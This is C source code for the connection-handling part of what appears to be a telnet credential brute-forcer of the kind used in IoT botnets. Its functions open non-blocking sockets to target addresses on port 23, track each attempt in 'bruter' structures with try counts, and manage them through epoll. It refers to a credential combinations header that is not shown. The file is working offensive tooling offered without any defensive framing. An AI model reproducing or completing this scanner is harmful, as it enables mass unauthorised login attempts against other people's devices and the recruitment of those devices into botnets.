#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/epoll.h>

#include "headers/main.h"
#include "headers/dead.h"
#include "headers/resp.h"
#include "headers/queue.h"
#include "headers/combos.h"

void start_connection(char *address, Brute *old_brute)
{
    int fd;

    if((fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0)) == -1)
        return;

    // Check if fd is within bounds
    if(fd >= MAX_SOCKETS || fd < 0) {
        close(fd);
        return;
    }

    if(fd > maxfds)
        maxfds = fd;

    // Clear the bruter structure first
    bzero(&bruter[fd], sizeof(Brute));

    if(address != NULL) {
        strncpy(bruter[fd].address, address, sizeof(bruter[fd].address) - 1);
        bruter[fd].address[sizeof(bruter[fd].address) - 1] = '\0';
    } else if(old_brute != NULL) {
        strncpy(bruter[fd].address, old_brute->address, sizeof(bruter[fd].address) - 1);
        bruter[fd].address[sizeof(bruter[fd].address) - 1] = '\0';
        bruter[fd].tries = old_brute->tries;
    } else {
        // No valid address provided
        close(fd);
        return;
    }

    // Validate IP address
    if(inet_addr(bruter[fd].address) == INADDR_NONE) {
        close(fd);
        bzero(&bruter[fd], sizeof(Brute));
        return;
    }

    struct sockaddr_in addr = {AF_INET, tport, .sin_addr.s_addr = inet_addr(bruter[fd].address)};
    
    if(connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        if(errno != EINPROGRESS) {
            // Connection failed immediately
            close(fd);
            bzero(&bruter[fd], sizeof(Brute));
            return;
        }
    }

#ifdef DEBUG
    printf("Starting Connection For %s:23, fd: %d\n", bruter[fd].address, fd);
#endif
    control_epoll(fd, EPOLL_CTL_ADD, EPOLLIN | EPOLLET);

    bruter[fd].stage = BR_IACS;
    bruter[fd].fd = fd;
    bruter[fd].last_recv = time(0);
    
    ATOMIC_INC(&processing);
}

void check_connection(int fd, int fake_time)
{
    int err = 0, ret;
    socklen_t err_len = sizeof(int);

    ret = getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

    if(ret == 0 && err == 0)
    {
#ifdef DEBUG
        printf("Successfull Connection with %s:23\n", bruter[fd].address);
#endif
        control_epoll(fd, EPOLL_CTL_MOD, EPOLLIN | EPOLLET);
        bruter[fd].last_recv = fake_time;
    }
    else
    {
#ifdef DEBUG
        printf("Unsuccessfull Connection with %s:23\n", bruter[fd].address);
#endif
        control_epoll(fd, EPOLL_CTL_DEL, EPOLLOUT);
        close(fd);
        ATOMIC_DEC(&processing);
        bzero(&bruter[fd], sizeof(Brute));
    }
}

void disconnect(Brute *brute)
{
    if(brute == NULL || brute->fd <= 0)
        return;

    control_epoll(brute->fd, EPOLL_CTL_DEL, EPOLLOUT);
    close(brute->fd);

    bzero(brute, sizeof(Brute));
    ATOMIC_DEC(&processing);
}
